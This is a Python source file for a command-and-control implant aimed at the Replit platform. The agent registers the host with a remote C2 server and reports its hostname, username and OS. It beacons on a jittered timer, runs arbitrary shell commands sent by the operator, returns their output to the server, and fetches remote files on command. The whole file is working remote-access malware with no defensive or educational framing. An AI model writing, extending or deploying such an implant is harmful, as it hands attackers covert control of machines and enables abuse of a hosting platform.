#!/usr/bin/env python3
"""
Replit C2 Agent - Simple HTTP-based agent for Replit platform

This agent connects to C2 server via HTTP, registers itself,
and waits for commands. Works on Replit without any restrictions.
"""

import os
import sys
import json
import time
import uuid
import socket
import platform
import threading
import subprocess
from datetime import datetime

try:
    import requests
except ImportError:
    print("Installing requests...")
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=True)
    import requests


class ReplitC2Agent:
    """C2 Agent for Replit platform"""
    
    def __init__(self, server_url: str, auth_token: str = None):
        self.server_url = server_url.rstrip("/")
        self.auth_token = auth_token
        self.agent_id = None
        self.running = False
        self.sleep_interval = 60
        self.jitter = 10
        
        # Get system info
        self.hostname = socket.gethostname()
        self.username = os.environ.get("USER", "replit")
        self.os = platform.system().lower()
        self.arch = platform.machine()
        
    def register(self) -> bool:
        """Register agent with C2 server"""
        if self.agent_id:
            return True
            
        # Generate agent ID
        self.agent_id = f"replit-{uuid.uuid4().hex[:8]}"
        
        # Register with server
        data = {
            "id": self.agent_id,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os,
            "arch": self.arch,
            "ip_external": "replit",
            "platform_type": "replit"
        }
        
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        try:
            resp = requests.post(
                f"{self.server_url}/api/agent/register",
                json=data,
                headers=headers,
                timeout=30
            )
            
            if resp.status_code in (200, 201):
                print(f"[+] Registered: {self.agent_id}")
                return True
            else:
                print(f"[-] Registration failed: {resp.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False
    
    def get_commands(self) -> list:
        """Get pending commands from C2 server"""
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        try:
            resp = requests.get(
                f"{self.server_url}/api/agent/{self.agent_id}/commands",
                headers=headers,
                timeout=30
            )
            
            if resp.status_code == 200:
                return resp.json().get("commands", [])
            return []
            
        except Exception as e:
            print(f"[-] Get commands error: {e}")
            return []
    
    def execute_command(self, cmd: dict) -> dict:
        """Execute a command"""
        cmd_id = cmd.get("id")
        cmd_type = cmd.get("type")
        cmd_data = cmd.get("data", {})
        
        result = {
            "command_id": cmd_id,
            "status": "success",
            "output": "",
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            if cmd_type == "ping":
                result["output"] = "pong"
                
            elif cmd_type == "shell":
                # Execute shell command
                output = subprocess.run(
                    cmd_data.get("cmd", ""),
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=300
                )
                result["output"] = output.stdout + output.stderr
                result["status"] = "success" if output.returncode == 0 else "error"
                
            elif cmd_type == "download":
                # Download and execute file
                url = cmd_data.get("url")
                if url:
                    resp = requests.get(url, timeout=60)
                    if resp.status_code == 200:
                        # Save and execute
                        filename = cmd_data.get("filename", "downloaded.py")
                        with open(filename, "wb") as f:
                            f.write(resp.content)
                        result["output"] = f"Downloaded: {filename}"
                    else:
                        result["status"] = "error"
                        result["output"] = f"Download failed: {resp.status_code}"
                        
            elif cmd_type == "sleep":
                # Change sleep interval
                self.sleep_interval = cmd_data.get("interval", 60)
                self.jitter = cmd_data.get("jitter", 10)
                result["output"] = f"Sleep interval: {self.sleep_interval}s"
                
            elif cmd_type == "exit":
                # Stop agent
                self.running = False
                result["output"] = "Agent stopping"
                
            else:
                result["status"] = "error"
                result["output"] = f"Unknown command type: {cmd_type}"
                
        except Exception as e:
            result["status"] = "error"
            result["output"] = str(e)
        
        return result
    
    def send_result(self, result: dict) -> bool:
        """Send command result to C2 server"""
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        try:
            resp = requests.post(
                f"{self.server_url}/api/agent/{self.agent_id}/result",
                json=result,
                headers=headers,
                timeout=30
            )
            return resp.status_code == 200
        except Exception as e:
            print(f"[-] Send result error: {e}")
            return False
    
    def beacon(self):
        """Send beacon to C2 server"""
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        try:
            resp = requests.post(
                f"{self.server_url}/api/agent/{self.agent_id}/beacon",
                json={"status": "alive", "timestamp": datetime.now().isoformat()},
                headers=headers,
                timeout=30
            )
            return resp.status_code == 200
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return False
    
    def run(self):
        """Main agent loop"""
        if not self.register():
            print("[-] Registration failed, retrying...")
            time.sleep(30)
            if not self.register():
                print("[-] Cannot register, exiting")
                return
        
        self.running = True
        print(f"[+] Agent running: {self.agent_id}")
        
        while self.running:
            try:
                # Send beacon
                self.beacon()
                
                # Get commands
                commands = self.get_commands()
                
                # Execute commands
                for cmd in commands:
                    print(f"[*] Executing: {cmd.get('type')}")
                    result = self.execute_command(cmd)
                    self.send_result(result)
                    print(f"[*] Result: {result['status']}")
                
                # Sleep with jitter
                import random
                sleep_time = self.sleep_interval + random.randint(-self.jitter, self.jitter)
                time.sleep(max(1, sleep_time))
                
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                self.running = False
            except Exception as e:
                print(f"[-] Loop error: {e}")
                time.sleep(30)


def main():
    # Get C2 server URL from environment or argument
    server_url = os.environ.get("C2_SERVER_URL", "")
    auth_token = os.environ.get("C2_AUTH_TOKEN", "")
    
    if len(sys.argv) > 1:
        server_url = sys.argv[1]
    if len(sys.argv) > 2:
        auth_token = sys.argv[2]
    
    if not server_url:
        print("Usage: python agent.py <C2_SERVER_URL> [AUTH_TOKEN]")
        print("   or: C2_SERVER_URL=http://... python agent.py")
        sys.exit(1)
    
    print(f"[*] Connecting to: {server_url}")
    
    agent = ReplitC2Agent(server_url, auth_token)
    agent.run()


if __name__ == "__main__":
    main()
